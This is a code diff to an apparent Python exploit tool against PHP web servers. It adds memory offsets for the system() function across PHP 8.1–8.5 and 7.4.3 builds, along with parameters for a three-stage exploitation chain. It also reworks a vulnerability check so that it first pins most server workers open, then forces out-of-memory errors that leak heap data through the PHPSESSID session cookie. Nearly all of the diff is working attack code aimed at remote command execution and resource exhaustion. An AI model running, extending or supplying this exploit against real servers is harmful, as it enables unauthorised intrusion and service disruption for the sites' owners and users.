@@ -73,6 +73,46 @@ PROFILES: dict[str, dict] = {
         "stage3_pads_bookworm": [(31, 31)] * 6,
         "stage3_carrier": True,
     },
+    "8.4.25-amd64": {
+        "zif_system": 0x464C70, "zval_ptr_dtor": 0x65DC60,
+        "htdata_candidates": [0x690D8],
+        "stage1_n": 841, "stage1_forge_len": 79,
+        "stage2_t": 406, "stage2_v": 16,
+        "stage3_pads_bookworm": [(31, 31)] * 6,
+        "stage3_carrier": True,
+    },
+    "8.3.35-amd64": {
+        "zif_system": 0x3AC080, "zval_ptr_dtor": 0x49EC50,
+        "htdata_candidates": [0x690D8, 0x6E0D8, 0x5404A],
+        "stage1_n": 841, "stage1_forge_len": 79,
+        "stage2_t": 406, "stage2_v": 16,
+        "stage3_pads_bookworm": [(31, 31)] * 6,
+        "stage3_carrier": True,
+    },
+    "8.2.34-amd64": {
+        "zif_system": 0x39B8A0, "zval_ptr_dtor": 0x487650,
+        "htdata_candidates": [0x690D8, 0x6E0D8, 0x5404A],
+        "stage1_n": 841, "stage1_forge_len": 79,
+        "stage2_t": 406, "stage2_v": 16,
+        "stage3_pads_bookworm": [(31, 31)] * 6,
+        "stage3_carrier": True,
+    },
+    "8.2.33-amd64": {
+        "zif_system": 0x39B7A0, "zval_ptr_dtor": 0x4870D0,
+        "htdata_candidates": [0x690D8, 0x6E0D8, 0x5404A],
+        "stage1_n": 841, "stage1_forge_len": 79,
+        "stage2_t": 406, "stage2_v": 16,
+        "stage3_pads_bookworm": [(31, 31)] * 6,
+        "stage3_carrier": True,
+    },
+    "8.1.31-amd64": {
+        "zif_system": 0x36B050, "zval_ptr_dtor": 0x450100,
+        "htdata_candidates": [0x690D8, 0x6E0D8, 0x5404A],
+        "stage1_n": 841, "stage1_forge_len": 79,
+        "stage2_t": 406, "stage2_v": 16,
+        "stage3_pads_bookworm": [(31, 31)] * 6,
+        "stage3_carrier": True,
+    },
     # Offset-only (no verified stage3, but stages 1+2 should work)
     "8.5.0-amd64": {
         "zif_system": 0x503510, "zval_ptr_dtor": 0x731D80,
@@ -86,6 +126,15 @@ PROFILES: dict[str, dict] = {
         "zif_system": 0x3771F0, "zval_ptr_dtor": 0x467CF0,
         "htdata_candidates": [0x690D8, 0x6E0D8, 0x5404A],
         "stage1_n": 0, "stage1_forge_len": 0,
+        "stage2_t": 406, "stage2_v": 16,
+        "stage3_pads_bookworm": [(31, 31)] * 6,
+        "stage3_carrier": True,
+    },
+    # Ubuntu 20.04 php7.4.3
+    "7.4.3-amd64": {
+        "zif_system": 0x1D9590, "zval_ptr_dtor": 0x297110,
+        "htdata_candidates": [0x690D8, 0x6E0D8, 0x5404A],
+        "stage1_n": 0, "stage1_forge_len": 79,
         "stage2_t": 406, "stage2_v": 16,
         "stage3_pads_bookworm": [(31, 31)] * 6,
         "stage3_carrier": True,
@@ -107,6 +156,12 @@ HTDATA_CANDIDATES = [0x690D8, 0x6E0D8, 0x5404A]
 
 USE_SSL = False
 SSL_HOST = ""
+
+
+def _host_header(host: str, port: int) -> str:
+    if (USE_SSL and port == 443) or (not USE_SSL and port == 80):
+        return host
+    return f"{host}:{port}"
 
 
 def _connect(host: str, port: int, timeout: float = 10.0) -> socket.socket:
@@ -147,7 +202,7 @@ def send_post(host: str, port: int, path: str, body: bytes, boundary: bytes,
         extra += f"{k}: {v}\r\n"
     hdr = (
         f"POST {path} HTTP/1.1\r\n"
-        f"Host: {host}:{port}\r\n"
+        f"Host: {_host_header(host, port)}\r\n"
         f"{extra}"
         f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
         f"Content-Length: {len(body)}\r\n"
@@ -228,7 +283,7 @@ def parse_cookie(resp: bytes | None) -> bytes:
 # Fingerprinting and profiling
 # ---------------------------------------------------------------------------
 def fingerprint(host: str, port: int, path: str) -> str:
-    req = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+    req = (f"GET {path} HTTP/1.1\r\nHost: {_host_header(host, port)}\r\n"
            f"Connection: close\r\n\r\n").encode()
     resp = send_raw(host, port, req, timeout=10)
     m = re.search(rb"X-Powered-By:\s*PHP/(\d+\.\d+\.\d+)", resp, re.IGNORECASE)
@@ -340,7 +395,7 @@ def probe_memory_limit(host: str, port: int, path: str) -> int | None:
     for mb in (16, 64, 256):
         body = b"big=" + b"A" * (mb * 1024 * 1024)
         hdr = (
-            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+            f"POST {path} HTTP/1.1\r\nHost: {_host_header(host, port)}\r\n"
             f"Content-Type: application/x-www-form-urlencoded\r\n"
             f"Content-Length: {len(body)}\r\n"
             f"Connection: close\r\n\r\n"
@@ -376,7 +431,7 @@ def hold_workers(host: str, port: int, path: str, count: int) -> list[socket.soc
         try:
             s = _connect(host, port, 5)
             s.sendall(
-                f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+                f"POST {path} HTTP/1.1\r\nHost: {_host_header(host, port)}\r\n"
                 f"Content-Type: application/x-www-form-urlencoded\r\n"
                 f"Content-Length: 1048576\r\n\r\nx".encode()
             )
@@ -401,7 +456,7 @@ def auto_detect_workers(host: str, port: int, path: str,
         try:
             s = _connect(host, port, 3)
             s.sendall(
-                f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+                f"POST {path} HTTP/1.1\r\nHost: {_host_header(host, port)}\r\n"
                 f"Content-Type: application/x-www-form-urlencoded\r\n"
                 f"Content-Length: 1048576\r\n\r\nx".encode()
             )
@@ -413,7 +468,7 @@ def auto_detect_workers(host: str, port: int, path: str,
         try:
             probe = _connect(host, port, 2)
             probe.sendall(
-                f"GET {path} HTTP/1.0\r\nHost: {host}:{port}\r\n\r\n".encode())
+                f"GET {path} HTTP/1.0\r\nHost: {_host_header(host, port)}\r\n\r\n".encode())
             probe.settimeout(2)
             data = probe.recv(256)
             alive = b"HTTP/" in data
@@ -708,7 +763,7 @@ def check_proof_container(container: str, proof_file: str,
 
 
 def check_proof_http(host: str, port: int, proof_path: str) -> str | None:
-    req = (f"GET {proof_path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+    req = (f"GET {proof_path} HTTP/1.1\r\nHost: {_host_header(host, port)}\r\n"
            f"Connection: close\r\n\r\n").encode()
     resp = send_raw(host, port, req, timeout=5)
     if b"200 OK" in resp[:50]:
@@ -751,7 +806,7 @@ def check_vuln(host: str, port: int, path: str, mem_mb: int = 0) -> int:
 
     # Check 2: SAPI detection (mod_php vs FPM)
     print("[2/6] SAPI detection")
-    req = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+    req = (f"GET {path} HTTP/1.1\r\nHost: {_host_header(host, port)}\r\n"
            f"Connection: close\r\n\r\n").encode()
     resp = send_raw(host, port, req, timeout=10)
     hdrs = resp.split(b"\r\n\r\n")[0] if b"\r\n\r\n" in resp else resp[:1024]
@@ -818,7 +873,7 @@ def check_vuln(host: str, port: int, path: str, mem_mb: int = 0) -> int:
     elif strict_cookie:
         print(f"  No -- server replaced session ID (strict_mode=On)")
     else:
-        req2 = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+        req2 = (f"GET {path} HTTP/1.1\r\nHost: {_host_header(host, port)}\r\n"
                 f"Cookie: PHPSESSID={strict_sid.decode()}\r\n"
                 f"Connection: close\r\n\r\n").encode()
         resp2 = send_raw(host, port, req2, timeout=10)
@@ -861,38 +916,52 @@ def check_vuln(host: str, port: int, path: str, mem_mb: int = 0) -> int:
             limits_to_try = [8, 16, 32, 64, 128, 256, 512]
             print("  memory_limit unknown, sweeping common values...")
 
+        print("  Detecting workers for disclosure test...")
+        worker_count = auto_detect_workers(host, port, path)
+        holders = []
+        if worker_count > 1:
+            print(f"  {worker_count} workers detected, pinning {worker_count - 1}...")
+            holders = hold_workers(host, port, path, worker_count - 1)
+
         disclosure = False
         post_max_blocked = False
-        for try_mb in limits_to_try:
-            huge = try_mb + 12
-            print(f"  Trying memory_limit={try_mb}M (body={huge}M)...")
-            resp_a = stage1_oom(host, port, path, huge)
+        try:
+            for try_mb in limits_to_try:
+                huge = try_mb + 12
+                print(f"  Trying memory_limit={try_mb}M (body={huge}M)...")
+                resp_a = stage1_oom(host, port, path, huge)
 
-            oom_visible = resp_a and b"Allowed memory size" in resp_a
-            got_response = resp_a and len(resp_a) > 0
+                oom_visible = resp_a and b"Allowed memory size" in resp_a
+                got_response = resp_a and len(resp_a) > 0
 
-            if resp_a and (b"413" in resp_a[:50] or b"Request Entity Too Large" in resp_a):
-                print(f"    413 -- post_max_size < {huge}M")
-                post_max_blocked = True
-                continue
+                if resp_a and (b"413" in resp_a[:50] or b"Request Entity Too Large" in resp_a):
+                    print(f"    413 -- post_max_size < {huge}M")
+                    post_max_blocked = True
+                    continue
 
-            if not got_response:
-                print(f"    No response (connection dropped or timeout)")
-                continue
+                if not got_response:
+                    print(f"    No response (connection dropped or timeout)")
+                    continue
 
-            if oom_visible:
-                print(f"    OOM error visible in response")
+                if oom_visible:
+                    print(f"    OOM error visible in response")
 
-            time.sleep(0.3)
-            cookie = stage1_leak(host, port, path, 900, 48)
-            if len(cookie) > 40:
-                print(f"    VULNERABLE -- leaked {len(cookie)}B via PHPSESSID cookie")
-                disclosure = True
-                break
-            elif len(cookie) > 0:
-                print(f"    Cookie normal ({len(cookie)}B) -- OOM may not have fired")
-            else:
-                print(f"    No cookie returned")
+                time.sleep(0.3)
+                cookie = stage1_leak(host, port, path, 900, 48)
+                if len(cookie) > 40:
+                    print(f"    VULNERABLE -- leaked {len(cookie)}B via PHPSESSID cookie")
+                    disclosure = True
+                    break
+                elif len(cookie) > 0:
+                    print(f"    Cookie normal ({len(cookie)}B) -- OOM may not have fired")
+                else:
+                    print(f"    No cookie returned")
+        finally:
+            for s in holders:
+                try:
+                    s.close()
+                except OSError:
+                    pass
 
         if not disclosure and post_max_blocked:
             print("  post_max_size is too small for OOM trigger")
